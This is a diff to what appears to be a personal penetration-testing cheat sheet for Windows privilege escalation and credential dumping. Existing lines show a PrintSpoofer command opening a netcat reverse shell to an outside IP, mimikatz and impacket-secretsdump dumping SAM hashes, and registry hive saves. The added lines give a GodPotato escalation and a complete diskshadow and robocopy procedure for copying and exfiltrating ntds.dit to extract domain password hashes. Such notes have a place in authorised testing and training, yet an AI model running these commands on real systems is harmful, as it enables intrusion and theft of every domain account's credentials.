@@ -1042,6 +1042,7 @@ EXEC xp_cmdshell 'whoami';
    #+begin_example
 .\PrintSpoofer64.exe -c "C:\TEMP\nc.exe 192.168.45.235 5555 -e cmd"
 .\PrintSpoofer64.exe -i -c powershell.exe
+.\GodPotato.exe -cmd "cmd /c whoami"
    #+end_example
     
    #+begin_example
@@ -1068,11 +1069,34 @@ reg save hklm\system system.hiv
 impacket-secretsdump -sam sam.hive -system system.hive LOCAL -> to decrypt
 .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
    #+end_example
-
    #+begin_example
 .\mimikatz.exe "lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM" "exit"
 .\mimikatz.exe "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
    #+end_example
+ntds.dit 
+Create file
+ #+begin_example
+nano raj.dsh
+set context persistent nowriters
+add volume c: alias raj
+create
+expose %raj% z:
+unix2dos raj.dsh
+#+end_example
+#+begin_example
+cd C:\Temp
+upload raj.dsh
+diskshadow /s raj.dsh
+robocopy /b z:\windows\ntds . ntds.dit
+reg save hklm\system c:\Temp\system
+cd C:\Temp
+download ntds.dit
+download system
+
+impacket-secretsdump -ntds ntds.dit -system system local
+#+end_example
+
+
 
    ---------------
     
